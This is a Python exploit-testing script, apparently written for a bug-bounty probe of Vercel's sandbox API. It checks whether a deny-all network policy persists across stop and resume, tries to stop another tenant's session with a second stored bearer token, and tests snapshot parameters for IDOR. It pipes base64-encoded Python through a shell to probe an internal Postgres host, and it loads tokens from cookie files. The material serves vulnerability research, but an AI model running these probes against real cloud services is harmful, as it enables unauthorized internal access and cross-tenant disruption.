# -*- coding: utf-8 -*-
"""策略更新持久化 + stop 跨租户 (v45)
P1: 运行中 POST 更新策略 deny-all -> stop -> resume -> 策略是否保持?
    (bounty table Medium: 策略更新未持久化 / resume 后失效 / stale readback)
P2: victim 调 attacker 的 session stop -> 跨租户 DoS?
P3: resume?snapshotId= 指定快照恢复 -> IDOR?"""
import base64, json, sys, time, urllib.request, urllib.error
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

NAME = 'poltest45'

def load_token(path):
    for ln in open(path, encoding='utf-8'):
        if ln.startswith('authorization=Bearer '):
            return ln.split('Bearer ')[1].strip()
    raise RuntimeError('no token in ' + path)

TOK_V = load_token(r'F:\scan\vercel_cookies2.txt')
TEAM_V = 'team_jnske5hDpDfj9eDG2PAfDqWf'
PROJ_V = 'prj_LX0QDsEAlWA0uRZvVTunSef3lllF'

def api_tok(tok, method, path, body=None, timeout=60):
    req = urllib.request.Request('https://api.vercel.com' + path, method=method)
    req.add_header('Authorization', 'Bearer ' + tok)
    req.add_header('Content-Type', 'application/json')
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:300]
    except Exception as e:
        return -1, 'EXC %s' % e

def mk():
    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    time.sleep(3)
    for attempt in range(8):
        c, r = api("POST", "/v4/sandboxes?teamId=%s" % TEAM, {"projectId": PROJ, "name": NAME}, 60)
        if c == 429:
            print('[create] 429 retry %d' % (attempt + 1), flush=True)
            time.sleep(20)
            continue
        break
    print('[create] -> %s' % c, flush=True)
    if c != 200:
        sys.exit(1)
    return json.loads(r)['sandbox']['currentSessionId']

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

PG_CODE = '''import socket,struct,time
s=socket.socket(); s.settimeout(4)
rc=s.connect_ex(('172.31.0.2',5432))
print('PG_CONNECT', rc)
if rc==0:
    s.sendall(struct.pack('!II',8,80877103))
    time.sleep(0.8)
    try:
        d=s.recv(4); print('PG_RESP', d)
    except Exception as e:
        print('PG_ERR', type(e).__name__)
'''

def probe(tag):
    b64 = base64.b64encode(PG_CODE.encode()).decode()
    c, r = cmd('poltest45', 'sh', ['-c', 'echo %s | base64 -d | python3' % b64], timeout_ms=30000)
    print('[%s] %s' % (tag, parse_data(r).strip()[:100]), flush=True)

def get_state(tag):
    c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    try:
        d = json.loads(r)
        sb, sess = d.get('sandbox', {}), d.get('session', {})
        print('[%s] status=%s snap=%s' % (tag, sb.get('status'), sb.get('currentSnapshotId')), flush=True)
        print('[%s] sandbox.np=%s' % (tag, json.dumps(sb.get('networkPolicy'))), flush=True)
        print('[%s] session.np=%s' % (tag, json.dumps(sess.get('networkPolicy'))), flush=True)
    except Exception as e:
        print('[%s ERR] %s %s' % (tag, c, (r or '')[:200]), flush=True)

if __name__ == '__main__':
    # ===== P1: 策略更新持久化 =====
    print('=== P1: runtime policy update persistence ===', flush=True)
    sid = mk()
    print('sid =', sid, flush=True)
    time.sleep(5)
    get_state('A0-fresh')
    probe('A0')  # allow-all 基线: PG 可达
    # 运行中更新为 deny-all
    c, r = api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM), {'mode': 'deny-all'}, 60)
    print('[update deny-all] -> %d %s' % (c, (r or '')[:150]), flush=True)
    time.sleep(4)
    get_state('A1-updated')
    probe('A1')  # deny-all: PG 113
    # stop -> resume
    c, r = api('POST', '/v2/sandboxes/sessions/%s/stop?teamId=%s&projectId=%s' % (sid, TEAM, PROJ), {}, timeout=90)
    print('[stop] -> %d' % c, flush=True)
    snap = None
    try:
        snap = json.loads(r)['sandbox']['currentSnapshotId']
    except Exception:
        pass
    print('snap =', snap, flush=True)
    time.sleep(3)
    c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true' % (NAME, TEAM, PROJ), timeout=120)
    print('[resume] -> %d' % c, flush=True)
    time.sleep(10)
    get_state('A2-resumed')
    probe('A2')  # 关键: 若 113 -> 策略保持; 若 0/bS -> 策略丢失(更新未持久化!)

    # ===== P2: stop 跨租户 =====
    print('=== P2: victim stop attacker sandbox ===', flush=True)
    c, r = api_tok(TOK_V, 'POST', '/v2/sandboxes/sessions/%s/stop?teamId=%s&projectId=%s' % (sid, TEAM_V, PROJ_V), {}, timeout=90)
    print('[victim stop] -> %d %s' % (c, (r or '')[:200]), flush=True)
    c, r = api_tok(TOK_V, 'POST', '/v2/sandboxes/sessions/%s/stop?teamId=%s' % (sid, TEAM_V), {}, timeout=90)
    print('[victim stop no proj] -> %d %s' % (c, (r or '')[:200]), flush=True)
    # 确认 attacker sandbox 状态
    get_state('A3-after-victim-stop')

    # ===== P3: resume snapshotId 参数 =====
    print('=== P3: resume with snapshotId param ===', flush=True)
    if snap:
        c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true&snapshotId=%s' % (NAME, TEAM, PROJ, snap), timeout=120)
        print('[resume own snap] -> %d %s' % (c, (r or '')[:200]), flush=True)
        c, r = api('GET', '/v2/sandboxes/%s?teamId=%s&projectId=%s&resume=true&snapshot=%s' % (NAME, TEAM, PROJ, snap), timeout=120)
        print('[resume own snap alt] -> %d %s' % (c, (r or '')[:200]), flush=True)

    api("DELETE", "/v2/sandboxes/%s?teamId=%s&projectId=%s" % (NAME, TEAM, PROJ))
    print('CLEANED', flush=True)
